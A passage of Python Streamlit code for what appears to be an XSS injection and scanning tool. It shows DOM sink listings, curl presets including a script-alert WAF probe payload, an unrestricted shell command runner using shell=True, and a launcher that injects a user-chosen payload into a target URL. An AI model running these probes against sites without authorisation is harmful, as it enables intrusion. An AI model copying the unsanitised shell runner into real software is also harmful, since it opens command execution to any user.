        st.subheader(f"🔬 DOM Sinks ({len(st.session_state.dom_sinks)} found)")
        st.caption("These patterns process user-controllable data — prime DOM XSS targets.")
        for s in st.session_state.dom_sinks:
            st.code(s, language="javascript")
    else:
        st.info("DOM sinks appear after a scan.")

with tab4:
    st.subheader("Manual Command Runner")
    mc = st.text_input("Command",
                        placeholder="curl -sIL https://target.com")
    if target_input:
        presets = {
            "Headers":   f"curl -sIL {target_input}",
            "CSP":       f"curl -sI {target_input} | grep -i content-security",
            "Cookies":   f"curl -sIL {target_input} | grep -i set-cookie",
            "WAF probe": f'curl -s "{target_input}?q=%3Cscript%3Ealert(1)%3C/script%3E" -o /dev/null -w "%{{http_code}}"',
            "DOM dump":  f"curl -sL {target_input} | grep -oP '.{{0,50}}innerHTML.{{0,80}}'",
        }
        pcols = st.columns(len(presets))
        for i, (label, cmd) in enumerate(presets.items()):
            with pcols[i]:
                if st.button(label, use_container_width=True):
                    mc = cmd
    if st.button("▶ Run") and mc.strip():
        with st.spinner("Running..."):
            try:
                r   = subprocess.run(mc, shell=True, capture_output=True,
                                     text=True, timeout=30)
                out = (r.stdout + r.stderr).strip() or "(no output)"
            except subprocess.TimeoutExpired:
                out = "[TIMEOUT after 30s]"
            except Exception as e:
                out = f"[ERROR] {e}"
        st.code(out, language="bash")

# Launch
if start_btn:
    if not target_input.strip():
        st.warning("Enter a target URL.")
    elif not payload_input.strip():
        st.warning("Enter what you want to inject.")
    else:
        st.session_state.update({
            "_last_target": target_input.strip(),
            "_last_payload": payload_input.strip(),
            "_last_depth": depth_input,
            "_last_blind_url": blind_input.strip(),
            "running": True, "done": False,
            "log": [], "findings": [], "dom_sinks": [],
            "pages_crawled": 0, "points_found": 0, "vulns_found": 0,
            "exploit_code": "", "report": "", "waf_detected": "",
        })
        st.rerun()

if st.session_state.running and not st.session_state.done:
    run_agent(
        st.session_state._last_target,
        st.session_state._last_payload,
        int(st.session_state._last_depth),
        st.session_state._last_blind_url,
        term_ph, s_phs,
    )
    st.rerun()
